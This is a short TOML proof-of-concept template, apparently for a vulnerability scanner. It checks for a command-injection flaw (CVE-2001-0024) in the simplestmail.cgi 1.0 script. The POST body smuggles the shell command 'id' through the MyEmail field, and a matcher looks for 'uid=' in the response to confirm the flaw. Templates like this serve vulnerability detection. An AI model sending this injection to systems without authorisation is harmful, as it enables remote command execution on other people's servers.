[info]
author = "AVE"
description = "simplestmail.cgi 1.0 未对 MyEmail 参数进行过滤，攻击者可通过 POST 请求注入 shell 元字符（如 ;）实现远程命令执行。发送 MyEmail=;id 并匹配响应中的 uid= 字符串即可验证。"
id = "POC-AVE-2001-0011"
name = "Leif M. Wright simplestmail.cgi 1.0 Remote Command Execution PoC"
severity = "high"
tags = ["ave-2001-0011"]
vuln_id = [
    "CVE-2001-0024",
    "AVE-2001-0011",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/cgi-bin/simplestmail.cgi"
protocol = "http"

[poc.requests.body]
content = "MyEmail=%3Bid&redirect=http%3A%2F%2Fexample.com&submit=run"
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
